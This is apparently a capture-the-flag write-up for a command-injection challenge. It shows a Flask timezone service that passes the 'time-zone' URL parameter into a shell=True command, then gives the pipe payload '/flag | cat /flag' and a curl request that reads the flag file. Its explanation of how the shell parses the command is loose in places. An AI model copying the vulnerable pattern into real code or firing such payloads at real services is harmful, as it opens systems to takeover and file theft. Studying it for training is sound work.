# CMDi4

## Challgen Description

In this challenge, the application is a **timezone viewer** that shows the current time for a given timezone. It accepts a `time-zone` parameter from the URL and internally runs the Linux `date` command with the provided timezone.

However, this application is **vulnerable to command injection**, due to the use of **unsanitized user input** in a shell command executed with `shell=True`.


## Server Code

Let's look at the vulnerable server-side code:

```python
#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/milestone", methods=["GET"])
def challenge():
    arg = flask.request.args.get("time-zone", "MST")
    command = f"TZ={arg} date"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the timezone service! Please choose a timezone to get the time there.
        <form action="/milestone"><input type=text name=time-zone><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```

The server constructs a shell command like:

```SHELL
TZ=<user_input> date
```

And then executes it using:

```Python
subprocess.run(command, shell=True, ...)
```

## Vulnerability

This code is vulnerable to Command Injection because:

* It directly interpolates user input (arg) into a shell command string.

* It uses shell=True, which causes the entire command string to be evaluated by the shell.

* There is no sanitization, escaping, or validation of the input.

If the user injects something like | cat /flag, the shell will execute it as part of the command.


## Exploit Breakdown

### Payload:

```SHELL
/flag | cat /flag
```

This makes the final shell command:

```SHELL
TZ=/flag | cat /flag date
```

What the Shell Sees:

This breaks into two commands via the `|` (pipe):

```SHELL
TZ=/flag
```
→ Sets an environment variable (mostly harmless)

```SHELL
cat /flag date
```

→ This is interpreted as:

```SHELL
cat /flag date
```

## Final Exploit Command

```SHELL
curl -v "http://challenge.localhost:80/milestone?time-zone=/flag%20|%20cat%20/flag""

```
